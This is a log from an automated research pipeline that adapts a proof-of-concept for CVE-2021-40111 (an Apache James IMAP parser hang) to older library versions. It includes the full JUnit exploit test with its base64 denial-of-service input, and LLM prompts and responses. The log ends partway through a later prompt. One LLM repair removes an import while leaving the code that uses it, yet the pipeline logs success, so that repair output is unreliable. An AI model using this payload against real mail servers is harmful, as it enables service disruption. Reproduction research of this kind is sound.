Running main_process.py for CVE: CVE-2021-40111
Versions: 3.4.0

[1m[Main] === Starting adaptation process for CVE-2021-40111 ===[0m
[96m[Processor] Fetching all available Maven versions...[0m
[96m[Analyzer] Loading cached versions from: /PoCAdaptation/library/org_apache_james_protocols_protocols-imap.txt[0m
[96m[Analyzer] org.apache.james.protocols:protocols-imap has 22 versions (cached).[0m
[96m[Processor] Identifying versions with successful reproduction...[0m
[96m[Processor] Pending versions: ['1.6.3', '3.0.0-beta5', '3.0.0-RC1', '3.0.0', '3.0.1', '3.1.0', '3.2.0', '3.3.0', '3.4.0'][0m
[96m[Preparer] Pending directory already exists: /PoCAdaptation/exploit/pending/CVE-2021-40111[0m
[92m[Main] Total affected versions: 11[0m
[92m[Main] Already reproduced versions: 2[0m
[93m[Main] Versions pending adaptation: 9[0m
[96m[Main]     -> ['1.6.3', '3.0.0-beta5', '3.0.0-RC1', '3.0.0', '3.0.1', '3.1.0', '3.2.0', '3.3.0', '3.4.0'][0m
[96m[Main]     -> ['3.5.0', '3.6.0'][0m
[96m[Executor] Running initial exploit mvn test in /PoCAdaptation/exploit/origin/CVE-2021-40111/exploit[0m
[91m[Executor] Initial exploit execution finished with return code 1[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'org.junit.runners.model.TestTimedOutException'[0m
[92m[Verifier] âœ“ Detail matched: 'test timed out'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Verifier] Initial exploit behavior verified successfully.[0m
[96m[Selector] Nearest need adapatation version selected: 3.4.0[0m
[96m[Selector] Closest reproduced version: 3.5.0 at index 9[0m
[96m[Adapter] Trying next closest version: 3.4.0[0m
[96m[Preparer] Using exploit from origin: /PoCAdaptation/exploit/origin/CVE-2021-40111/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2021-40111/3.4.0/exploit[0m
[96m[Preparer] Updating dependency version to 3.4.0 in /PoCAdaptation/exploit/pending/CVE-2021-40111/3.4.0/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 3.4.0 in /PoCAdaptation/exploit/pending/CVE-2021-40111/3.4.0/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 3.4.0...[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[Adapter] Attempting adaptation from base version 3.5.0 to 3.4.0...[0m
[96m[Adapter] Start adapting exploit from 3.5.0 to 3.4.0"[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[9,33] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Tag[0m
[92m[ErrorManager] Processing line: [ERROR]   location: package org.apache.james.imap.api[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[10,36] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class DecodingException[0m
[92m[ErrorManager] Processing line: [ERROR]   location: package org.apache.james.imap.decode[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,61] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Tag[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.StatusCommandParserChild[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,102] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class DecodingException[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.StatusCommandParserChild[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[30,31] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class DecodingException[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,59] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Tag[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[36,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: no arguments[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 2394 (prompt), 1 (completion), 2395 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 3.4.0:org.apache.james.protocols:protocols-imap.
This test file compiles and runs successfully with version 3.5.0.

Your task is to:
1. Analyze why this issue occurs with the *3.5.0* but not with the *3.4.0 version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2021-40111 >--------------------
[INFO] Building CVE-2021-40111 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2021-40111 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2021-40111 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2021-40111 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[9,33] cannot find symbol
  symbol:   class Tag
  location: package org.apache.james.imap.api
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[10,36] cannot find symbol
  symbol:   class DecodingException
  location: package org.apache.james.imap.decode
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,61] cannot find symbol
  symbol:   class Tag
  location: class edu.vision.se.StatusCommandParserChild
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,102] cannot find symbol
  symbol:   class DecodingException
  location: class edu.vision.se.StatusCommandParserChild
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[30,31] cannot find symbol
  symbol:   class DecodingException
  location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,59] cannot find symbol
  symbol:   class Tag
  location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[36,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
  required: no arguments
  found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory
  reason: actual and formal argument lists differ in length
[INFO] 7 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  1.343 s
[INFO] Finished at: 2025-07-13T15:33:09Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure: Compilation failure: 
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[9,33] cannot find symbol
[ERROR]   symbol:   class Tag
[ERROR]   location: package org.apache.james.imap.api
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[10,36] cannot find symbol
[ERROR]   symbol:   class DecodingException
[ERROR]   location: package org.apache.james.imap.decode
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,61] cannot find symbol
[ERROR]   symbol:   class Tag
[ERROR]   location: class edu.vision.se.StatusCommandParserChild
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,102] cannot find symbol
[ERROR]   symbol:   class DecodingException
[ERROR]   location: class edu.vision.se.StatusCommandParserChild
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[30,31] cannot find symbol
[ERROR]   symbol:   class DecodingException
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,59] cannot find symbol
[ERROR]   symbol:   class Tag
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[36,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
[ERROR]   required: no arguments
[ERROR]   found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory
[ERROR]   reason: actual and formal argument lists differ in length
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version='1.0' encoding='utf-8'?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>edu.vision.se</groupId>
    <artifactId>CVE-2021-40111</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>11</maven.compiler.source>
        <maven.compiler.target>11</maven.compiler.target>
    </properties>

    <dependencies>
        
        <dependency>
            <groupId>org.apache.james.protocols</groupId>
            <artifactId>protocols-imap</artifactId>
            <version>3.4.0</version>
        </dependency>
        <dependency>
            <groupId>org.assertj</groupId>
            <artifactId>assertj-core</artifactId>
            <version>3.22.0</version>
        </dependency>
    <dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version></dependency>
    
    </dependencies>

</project>
[LLMClient] Response: 
test
[96m[Adapter] LLM response for fix position: test[0m
[LLMClient] Tokens used: 136 (prompt), 10 (completion), 146 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 3.4.0: 

Error: cannot find symbol, class Tag, package org.apache.james.imap.api 

The test executes as expected in 3.5.0 

Error code: import org.apache.james.imap.api.Tag; 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
org.apache.james.imap.api.Tag;Tag
[96m[ErrorManager] Extracted key entities: ['org.apache.james.imap.api.Tag', 'Tag'][0m
[96m[Adapter] Try to solve error: {'file': '/PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 9, 'column': 33, 'message': 'cannot find symbol', 'symbol': 'class Tag', 'location': 'package org.apache.james.imap.api', 'code_line': 'import org.apache.james.imap.api.Tag;'} with cause: ['org.apache.james.imap.api.Tag', 'Tag'][0m
[LLMClient] Tokens used: 163 (prompt), 10 (completion), 173 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 3.4.0: 

Error: cannot find symbol, class Tag, package org.apache.james.imap.api 

The test executes as expected in 3.5.0 

Error code: import org.apache.james.imap.api.Tag; 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Current cause: ['org.apache.james.imap.api.Tag', 'Tag'] 

 failed to catch, try simpler or other entities.

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
org.apache.james.imap.api.Tag;Tag
[96m[ErrorManager] Extracted key entities: ['org.apache.james.imap.api.Tag', 'Tag'][0m
[96m[Adapter] Related diffs for error: [(4908, 10.0), (4910, 10.0), (4919, 10.0), (4960, 10.0), (4962, 10.0)][0m
[96m[Adapter] Fix position is in test code.[0m
[96m[RepairModule] Start repair for group: cannot find symbol | class Tag cause: ['org.apache.james.imap.api.Tag', 'Tag'][0m
[96m[RepairModule] Trying best diff #4908 with score 10.00[0m
[96m[RepairModule] Found 10 diff combinations for annealing.[0m
[96m[RepairModule] Iteration 1, temperature 1.000: Trying diff #(4919, 4960) with score 10.00[0m
[LLMClient] Tokens used: 853 (prompt), 456 (completion), 1309 (total)
[LLMClient] Prompt: 
You are given a Java test file with compilation errors in version 3.4.0:org.apache.james.protocols:protocols-imap.
This test file compiles and runs successfully in 3.5.0.

The diff is related to the diff.
Your task has three steps:
 1. Locate the code where the compilation error occurs.
 2. Analyze the diff from 3.5.0 to 3.4.0.
 3. Fix the error in the error position only when diff is helpful. Add import statement when needed according to the diff. 

Only output the modified version of the test file according to the diff. No explanations. If mocking, access fields via reflection if they exist.
### Compilation Errors:
message: cannot find symbol, symble: class Tag, location: package org.apache.james.imap.api

### Error Position:
import org.apache.james.imap.api.Tag;

### Related Diff:
Operation: MODIFIED, File: protocols/imap/src/main/java/org/apache/james/imap/api/message/response/StatusResponseFactory.java, Hunk: @@ -20,6 +20,7 @@
 package org.apache.james.imap.api.message.response;

 import org.apache.james.imap.api.ImapCommand;
-import org.apache.james.imap.api.Tag;
 import org.apache.james.imap.api.display.HumanReadableText;

 /**
Operation: MODIFIED, File: protocols/imap/src/main/java/org/apache/james/imap/decode/ImapCommandParser.java, Hunk: @@ -20,6 +20,7 @@
 package org.apache.james.imap.decode;

 import org.apache.james.imap.api.ImapMessage;
-import org.apache.james.imap.api.Tag;
 import org.apache.james.imap.api.process.ImapSession;

 /**

### Test File Content:
package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.imap.api.Tag;
import org.apache.james.imap.decode.DecodingException;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;

import java.nio.charset.StandardCharsets;


public class Testcase1 {
    @Test(timeout = 1000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);


        assertThatThrownBy(() -> new StatusCommandParserChild(new UnpooledStatusResponseFactory())
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        new ByteArrayOutputStream()), new Tag("AEA"), new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild(UnpooledStatusResponseFactory statusResponseFactory) {
        super(statusResponseFactory);
    }

    public void decode(ImapRequestStreamLineReader request, Tag tag, FakeImapSession session) throws DecodingException {
        super.decode(request, tag, session);
    }
}


[LLMClient] Response: 
Here's the modified version of the test file according to the diff:

```java
package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.imap.decode.DecodingException;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;

import java.nio.charset.StandardCharsets;


public class Testcase1 {
    @Test(timeout = 1000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);


        assertThatThrownBy(() -> new StatusCommandParserChild(new UnpooledStatusResponseFactory())
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        new ByteArrayOutputStream()), new Tag("AEA"), new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild(UnpooledStatusResponseFactory statusResponseFactory) {
        super(statusResponseFactory);
    }

    public void decode(ImapRequestStreamLineReader request, Tag tag, FakeImapSession session) throws DecodingException {
        super.decode(request, tag, session);
    }
}
```
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[9,36] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class DecodingException[0m
[92m[ErrorManager] Processing line: [ERROR]   location: package org.apache.james.imap.decode[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[38,61] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Tag[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.StatusCommandParserChild[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[38,102] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class DecodingException[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.StatusCommandParserChild[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,31] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class DecodingException[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[28,59] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Tag[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[35,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: no arguments[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[RepairModule] Old grouped keys: {'constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length |', 'cannot find symbol | class DecodingException', 'cannot find symbol | class Tag'}
[RepairModule] New grouped keys: {'constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length |', 'cannot find symbol | class DecodingException', 'cannot find symbol | class Tag'}
[92m[RepairModule] Error cannot find symbol resolved after applying diff.[0m
[92m[RepairModule] Repair success with diff #(4919, 4960) at iteration 1![0m
[96m[Adapter] Test code repair attempted.[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[9,36] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class DecodingException[0m
[92m[ErrorManager] Processing line: [ERROR]   location: package org.apache.james.imap.decode[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[38,61] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Tag[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.StatusCommandParserChild[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[38,102] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class DecodingException[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.StatusCommandParserChild[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,31] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class DecodingException[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[28,59] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Tag[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[35,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: no arguments[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 2246 (prompt), 1 (completion), 2247 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 3.4.0:org.apache.james.protocols:protocols-imap.
This test file compiles and runs successfully with version 3.5.0.

Your task is to:
1. Analyze why this issue occurs with the *3.5.0* but not with the *3.4.0 version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2021-40111 >--------------------
[INFO] Building CVE-2021-40111 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2021-40111 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2021-40111 ---
[INFO] No sources to compile
[INFO] 
